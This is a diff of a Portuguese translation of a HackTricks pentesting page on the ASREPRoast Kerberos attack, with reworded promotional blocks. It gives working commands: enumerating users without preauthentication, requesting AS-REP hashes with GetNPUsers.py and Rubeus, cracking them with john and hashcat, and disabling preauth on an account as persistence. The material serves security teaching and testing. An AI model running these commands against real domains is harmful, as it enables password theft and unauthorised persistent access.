@@ -2,46 +2,46 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+Outras formas de apoiar o HackTricks:
+
+* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof é o lar de todas as recompensas por bugs de criptografia.**
+Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de recompensas por bugs!
 
-**Seja recompensado sem atrasos**\
-As recompensas do HackenProof são lançadas apenas quando os clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.
+**Insights de Hacking**\
+Engaje-se com conteúdos que exploram a emoção e os desafios do hacking
 
-**Adquira experiência em pentesting web3**\
-Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.
+**Notícias de Hacking em Tempo Real**\
+Mantenha-se atualizado com o mundo acelerado do hacking através de notícias e insights em tempo real
 
-**Torne-se a lenda do hacker web3**\
-Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.
+**Últimos Anúncios**\
+Fique informado sobre os mais novos programas de recompensa por bugs e atualizações importantes da plataforma
 
-[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!
-
-{% embed url="https://hackenproof.com/register" %}
+**Junte-se a nós no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje mesmo!
 
 ## ASREPRoast
 
-O ataque ASREPRoast procura por **usuários sem o atributo de pré-autenticação Kerberos necessário (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.
+O ataque ASREPRoast procura por **usuários sem o atributo de pré-autenticação do Kerberos necessário (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.
 
-Isso significa que qualquer pessoa pode enviar uma solicitação AS\_REQ para o DC em nome de qualquer um desses usuários e receber uma mensagem AS\_REP. Esse último tipo de mensagem contém um bloco de dados criptografados com a chave do usuário original, derivada de sua senha. Em seguida, usando essa mensagem, a senha do usuário pode ser quebrada offline.
+Isso significa que qualquer pessoa pode enviar uma solicitação AS\_REQ ao DC em nome de qualquer um desses usuários e receber uma mensagem AS\_REP. Este último tipo de mensagem contém um bloco de dados criptografados com a chave do usuário original, derivada de sua senha. Então, usando esta mensagem, a senha do usuário pode ser quebrada offline.
 
-Além disso, **não é necessário uma conta de domínio para realizar esse ataque**, apenas a conexão com o DC. No entanto, **com uma conta de domínio**, uma consulta LDAP pode ser usada para **recuperar usuários sem pré-autenticação Kerberos** no domínio. **Caso contrário, os nomes de usuário devem ser adivinhados**.
+Além disso, **não é necessário ter uma conta de domínio para realizar este ataque**, apenas conexão com o DC. No entanto, **com uma conta de domínio**, uma consulta LDAP pode ser usada para **recuperar usuários sem pré-autenticação do Kerberos** no domínio. **Caso contrário, os nomes de usuário têm que ser adivinhados**.
 
 #### Enumerando usuários vulneráveis (necessita de credenciais de domínio)
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
-#### Solicitar mensagem AS_REP
+#### Solicitar mensagem AS\_REP
 
 {% code title="Usando Linux" %}
 ```bash
@@ -50,7 +50,11 @@ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -ou
 #Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
+```markdown
+{% endcode %}
+
 {% code title="Usando o Windows" %}
+```
 ```bash
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
@@ -58,49 +62,49 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-O Roasting AS-REP com o Rubeus irá gerar um 4768 com um tipo de criptografia de 0x17 e um tipo de pré-autenticação de 0.
+AS-REP Roasting com Rubeus irá gerar um 4768 com um tipo de criptografia de 0x17 e tipo de preautenticação de 0.
 {% endhint %}
 
-### Quebrando
+### Quebra
 ```
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Persistência
 
-Force **preauth** não é necessário para um usuário onde você tem permissões de **GenericAll** (ou permissões para escrever propriedades):
+Forçar **preauth** não necessário para um usuário onde você tem permissões **GenericAll** (ou permissões para escrever propriedades):
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 ## Referências
 
-[**Mais informações sobre o ataque de Roasting AS-REP no ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+[**Mais informações sobre AS-REP Roasting em ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof é o lar de todas as recompensas por bugs de criptografia.**
+Participe do servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de recompensas por bugs!
 
-**Seja recompensado sem atrasos**\
-As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.
+**Insights de Hacking**\
+Interaja com conteúdos que exploram a emoção e os desafios do hacking
 
-**Adquira experiência em pentesting web3**\
-Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.
+**Notícias de Hacking em Tempo Real**\
+Mantenha-se atualizado com o mundo acelerado do hacking através de notícias e insights em tempo real
 
-**Torne-se uma lenda hacker web3**\
-Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.
+**Últimos Anúncios**\
+Fique informado com os mais recentes lançamentos de recompensas por bugs e atualizações importantes da plataforma
 
-[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!
-
-{% embed url="https://hackenproof.com/register" %}
+**Junte-se a nós no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje mesmo!
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+Outras formas de apoiar o HackTricks:
+
+* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
